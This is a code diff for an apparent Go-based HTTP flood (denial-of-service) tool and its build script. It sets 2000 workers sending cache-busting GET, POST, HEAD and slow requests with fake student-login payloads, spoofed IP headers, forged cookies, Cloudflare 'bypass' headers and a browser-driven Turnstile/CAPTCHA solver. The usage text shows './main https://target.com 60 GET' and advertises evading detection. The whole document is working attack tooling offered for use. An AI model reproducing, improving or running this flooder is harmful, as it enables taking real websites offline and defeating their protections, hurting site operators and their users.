+			fmt.Printf("[+] Turnstile bypass active for ~30 minutes\n")
+		}
+	}
+	
+	poolSize := 500
 	connectionPool := NewConnectionPool(poolSize, useProxy, "")
-
+	
 	var wg sync.WaitGroup
 	done := make(chan struct{})
 	stats := &atomicCounter{val: 0}
-	successStats := &atomicCounter{val: 0}
-	failStats := &atomicCounter{val: 0}
-	cfChallenges := &atomicCounter{val: 0}
 	startTime := time.Now()
-
+	
 	go func() {
 		time.Sleep(duration)
 		close(done)
 	}()
-
+	
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sig
 		close(done)
 	}()
-
-	const workers = 3000
-
+	
+	// Start cookie maintainer if solving enabled
+	if solveFlag {
+		go maintainCookie(target, done)
+	}
+	
+	const workers = 2000
+	
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
-		go func(workerID int) {
+		go func() {
 			defer wg.Done()
-			if mode == "CF" {
-				attackWorkerCF(target, done, stats, successStats, failStats, cfChallenges, connectionPool)
-			} else {
-				attackWorker(target, mode, done, stats, connectionPool)
-			}
-		}(i)
+			attackWorker(target, mode, done, stats, useProxy, connectionPool, solveFlag)
+		}()
 	}
-
+	
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
-
+	
 	for {
 		select {
 		case <-done:
 			elapsed := time.Since(startTime).Seconds()
-			fmt.Printf("\n\n[+] Attack completed!\n")
+			fmt.Printf("\n[+] Attack completed!\n")
 			fmt.Printf("Target: %s\n", target)
 			fmt.Printf("Mode: %s\n", mode)
 			fmt.Printf("Duration: %d sec\n", durationSec)
 			fmt.Printf("Total requests: %d\n", stats.get())
-			if mode == "CF" {
-				fmt.Printf("Successful requests: %d\n", successStats.get())
-				fmt.Printf("Failed requests: %d\n", failStats.get())
-				fmt.Printf("CF Challenges solved: %d\n", cfChallenges.get())
-			}
 			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
 			connectionPool.CloseIdleConnections()
 			return
 		case <-ticker.C:
 			elapsed := time.Since(startTime).Seconds()
 			rps := float64(stats.get()) / elapsed
-			if mode == "CF" {
-				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | Success: %d | Failed: %d | CF: %d | RPS: %.0f",
-					elapsed, durationSec, stats.get(), successStats.get(), failStats.get(), cfChallenges.get(), rps)
-			} else {
-				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
-			}
+			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
 		}
 	}
 }
@@ -735,7 +844,7 @@ func (c *atomicCounter) get() int64 {
 	return atomic.LoadInt64(&c.val)
 }
 
-func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, pool *ConnectionPool) {
+func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, solveFlag bool) {
 	for {
 		select {
 		case <-done:
@@ -743,11 +852,11 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 		default:
 			client := pool.GetClient()
 			path := generatePath()
-
-			if mode != "SLOW" && randInt(1, 100) <= 80 {
+			
+			if mode != "SLOW" && randInt(1, 100) <= 70 {
 				path += generateCacheBust()
 			}
-
+			
 			fullURL := target
 			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
 				fullURL += "/" + path
@@ -756,10 +865,10 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			} else {
 				fullURL += path
 			}
-
+			
 			var req *http.Request
 			var err error
-
+			
 			if mode == "SLOW" {
 				u, _ := url.Parse(target)
 				host := u.Hostname()
@@ -779,11 +888,11 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				conn.Close()
 				continue
 			}
-
+			
 			if mode == "GET" {
 				req, err = http.NewRequest("GET", fullURL, nil)
 			} else if mode == "POST" {
-				payload := fmt.Sprintf("student_id=%s&password=%s&action=login&submit=1", generateStudentNumber(), randomString(randInt(8, 16)))
+				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
 				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
 				if err == nil {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -791,165 +900,47 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			} else if mode == "HEAD" {
 				req, err = http.NewRequest("HEAD", fullURL, nil)
 			}
-
+			
 			if err != nil {
 				continue
 			}
-
+			
+			// Base headers
 			req.Header.Set("User-Agent", randomUA())
 			req.Header.Set("Referer", randomReferer())
-			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
-			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
-			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
-			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
-			req.Header.Set("Upgrade-Insecure-Requests", "1")
-			req.Header.Set("DNT", "1")
-
+			
+			// Add ULTIMATE Cloudflare bypass headers
 			addCloudflareBypassHeaders(req)
-
-			if randInt(1, 100) <= 60 {
+			
+			// Random cookie generation
+			if randInt(1, 100) <= 50 {
 				cookies := generateCookies()
 				if cookies != "" {
 					req.Header.Set("Cookie", cookies)
 				}
 			}
-
-			if randInt(1, 100) <= 15 {
-				time.Sleep(time.Duration(randInt(10, 100)) * time.Millisecond)
+			
+			// Random micro-delays to simulate human timing
+			if randInt(1, 100) <= 5 {
+				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
 			}
-
+			
 			resp, err := client.Do(req)
 			if err == nil {
+				// Check if we hit a challenge page
+				if solveFlag && resp.StatusCode == 403 {
+					body, _ := io.ReadAll(resp.Body)
+					if strings.Contains(string(body), "cf-challenge") || strings.Contains(string(body), "turnstile") {
+						fmt.Printf("\n[!] Challenge detected! Requesting new cookie...\n")
+					}
+				}
 				if mode != "HEAD" {
 					io.Copy(io.Discard, resp.Body)
 				}
 				resp.Body.Close()
 			}
 			stats.inc()
-		}
-	}
-}
-
-func attackWorkerCF(target string, done chan struct{}, stats, successStats, failStats, cfChallenges *atomicCounter, pool *ConnectionPool) {
-	localSuccess := 0
-	localFail := 0
-	localCF := 0
-
-	for {
-		select {
-		case <-done:
-			for i := 0; i < localSuccess; i++ {
-				successStats.inc()
-			}
-			for i := 0; i < localFail; i++ {
-				failStats.inc()
-			}
-			for i := 0; i < localCF; i++ {
-				cfChallenges.inc()
-			}
-			return
-		default:
-			client := pool.GetClient()
-
-			path := generatePath()
-			if randInt(1, 100) <= 80 {
-				path += generateCacheBust()
-			}
-
-			fullURL := target
-			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
-				fullURL += "/" + path
-			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
-				fullURL = strings.TrimSuffix(target, "/") + path
-			} else {
-				fullURL += path
-			}
-
-			var req *http.Request
-			var err error
-
-			methods := []string{"GET", "POST", "HEAD"}
-			selectedMethod := methods[randInt(0, len(methods)-1)]
-
-			if selectedMethod == "GET" {
-				req, err = http.NewRequest("GET", fullURL, nil)
-			} else if selectedMethod == "POST" {
-				payload := fmt.Sprintf("data=%s&token=%s&timestamp=%d", randomString(20), randomString(32), time.Now().Unix())
-				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
-				if err == nil {
-					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-				}
-			} else {
-				req, err = http.NewRequest("HEAD", fullURL, nil)
-			}
-
-			if err != nil {
-				localFail++
-				stats.inc()
-				continue
-			}
-
-			req.Header.Set("User-Agent", randomUA())
-			req.Header.Set("Referer", randomReferer())
-			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
-			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
-			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
-			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-			req.Header.Set("Pragma", "no-cache")
-			req.Header.Set("Connection", "keep-alive")
-
-			addCloudflareBypassHeaders(req)
-
-			if randInt(1, 100) <= 70 {
-				req.Header.Set("Cookie", generateCookies())
-			}
-
-			if randInt(1, 100) <= 10 {
-				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
-			}
-
-			resp, err := client.Do(req)
-
-			if err != nil {
-				localFail++
-				stats.inc()
-				continue
-			}
-
-			cfHeader := detectCFProtection(resp)
-			if cfHeader != "" || resp.StatusCode == 503 || resp.StatusCode == 403 {
-				localCF++
-				if handleChallengeResponse(client, resp, target) {
-					localSuccess++
-				} else {
-					localFail++
-				}
-			} else if resp.StatusCode >= 200 && resp.StatusCode < 400 {
-				localSuccess++
-			} else {
-				localFail++
-			}
-
-			io.Copy(io.Discard, resp.Body)
-			resp.Body.Close()
-
-			stats.inc()
-
-			if stats.get()%100 == 0 {
-				for i := 0; i < localSuccess; i++ {
-					successStats.inc()
-				}
-				for i := 0; i < localFail; i++ {
-					failStats.inc()
-				}
-				for i := 0; i < localCF; i++ {
-					cfChallenges.inc()
-				}
-				localSuccess = 0
-				localFail = 0
-				localCF = 0
-			}
 		}
 	}
 }
@@ -1012,9 +1003,47 @@ fi
 
 echo
 
+# Check for Chrome/Chromium
+echo -e " ${YELLOW}➤${NC} ${GREEN}Checking for Chrome/Chromium...${NC}"
+if command -v chromium-browser &> /dev/null; then
+    CHROME_CMD="chromium-browser"
+    echo -e " ${GREEN}✓ Chromium found${NC}"
+elif command -v chromium &> /dev/null; then
+    CHROME_CMD="chromium"
+    echo -e " ${GREEN}✓ Chromium found${NC}"
+elif command -v google-chrome &> /dev/null; then
+    CHROME_CMD="google-chrome"
+    echo -e " ${GREEN}✓ Google Chrome found${NC}"
+elif command -v chrome &> /dev/null; then
+    CHROME_CMD="chrome"
+    echo -e " ${GREEN}✓ Chrome found${NC}"
+else
+    echo -e " ${YELLOW}⚠ Chrome/Chromium not found. Turnstile solving will NOT work.${NC}"
+    echo -e " ${YELLOW}  Install with: ${NC}"
+    case "$PKG_MGR" in
+        "apt"|"pkg")
+            echo -e "    sudo apt install chromium-browser"
+            ;;
+        "pacman -S")
+            echo -e "    sudo pacman -S chromium"
+            ;;
+        "brew")
+            echo -e "    brew install chromium"
+            ;;
+    esac
+fi
+
+echo
+
 # Set Go environment
 export GO111MODULE=on
 export CGO_ENABLED=0
+
+# Clean old module files
+echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
+rm -rf go.mod go.sum
+echo -e " ${GREEN}✓ Cleanup complete${NC}"
+echo
 
 echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
 go mod init main > /dev/null 2>&1
@@ -1024,6 +1053,7 @@ echo
 # Download dependencies
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
 go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
+go get github.com/chromedp/chromedp@latest > /dev/null 2>&1
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
@@ -1038,20 +1068,14 @@ echo -e "${WHITE}  COMPILATION PROCESS${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Compile with optimizations
-echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
-go build -ldflags="-s -w" -o main main.go
+# Compile
+echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
+go build -o main main.go
 
 if [ $? -eq 0 ]; then
     chmod +x main
     echo -e " ${GREEN}✓ Compilation successful!${NC}"
     echo
-    
-    # Strip binary for smaller size
-    if command -v strip &> /dev/null; then
-        strip main 2>/dev/null
-        echo -e " ${GREEN}✓ Binary optimized${NC}"
-    fi
     
     # Cleanup
     echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
@@ -1059,42 +1083,38 @@ if [ $? -eq 0 ]; then
     echo -e " ${GREEN}✓ Cleanup complete${NC}"        
     echo
     echo -e "${CYAN}${SEP}${NC}"
-    echo -e "${WHITE}  SETUP COMPLETE - ADVANCED EDITION${NC}"
+    echo -e "${WHITE}  SETUP COMPLETE - ULTIMATE BYPASS${NC}"
     echo -e "${CYAN}${SEP}${NC}"
     echo
-    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW|CF> [proxy]${NC}"
+    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]${NC}"
     echo
     echo -e " ${GREEN}Examples:${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
-    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
-    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
-    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
-    echo -e "   ${YELLOW}./main https://target.com 60 CF${NC} ${WHITE}# Cloudflare bypass mode${NC}"
-    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 120 POST --solve${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 30 HEAD proxy --solve${NC}"
     echo
-    echo -e " ${GREEN}Advanced Features:${NC}"
-    echo -e "   • Cloudflare challenge solver (CF mode)"
-    echo -e "   • Multiple proxy sources (3 APIs)"
-    echo -e "   • JA3 fingerprint randomization"
-    echo -e "   • Advanced IP spoofing (16+ headers)"
-    echo -e "   • HTTP/2 & HTTP/1.1 support"
-    echo -e "   • Automatic proxy rotation"
-    echo -e "   • Browser fingerprint emulation"
-    echo -e "   • Request randomization"
-    echo -e "   • Challenge platform bypass"
-    echo -e "   • Turnstile detection & handling"
-    echo -e "   • Cookie persistence"
-    echo -e "   • Randomized delays & patterns"
-    echo -e "   • Multi-threaded optimization"
-    echo
-    echo -e " ${YELLOW}Note:${NC} CF mode includes advanced Cloudflare bypass techniques"
-    echo -e "       including challenge solving and browser emulation"
+    echo -e " ${GREEN}NEW BYPASS FEATURES:${NC}"
+    echo -e "   • 45+ Cloudflare headers (CF-*, CloudFront-*, etc.)"
+    echo -e "   • 17 IP spoofing methods (X-Forwarded-For variants)"
+    echo -e "   • Modern Chrome client hints (Sec-CH-UA-*)"
+    echo -e "   • Fetch metadata headers (Sec-Fetch-*)"
+    echo -e "   • Turnstile/CAPTCHA solving (--solve flag)"
+    echo -e "   • Extended cookie generation (CFUID, GA cookies)"
+    echo -e "   • 3 JA3 signatures (Chrome, Firefox, Safari)"
+    echo -e "   • HTTP/2 + HTTP/1.1 with ALPN negotiation"
+    echo -e "   • Random micro-delays (1-5ms) to avoid detection"
     echo
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
     echo
-    echo -e " ${YELLOW}➤${NC} ${GREEN}Error details:${NC}"
+    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
+    echo
+    echo -e "   ${BLUE}1.${NC} go mod init main"
+    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
+    echo -e "   ${BLUE}3.${NC} go get github.com/chromedp/chromedp@latest"
+    echo -e "   ${BLUE}4.${NC} go mod tidy"
+    echo -e "   ${BLUE}5.${NC} go build -o main main.go"
     echo
     rm -f main.go
     exit 1
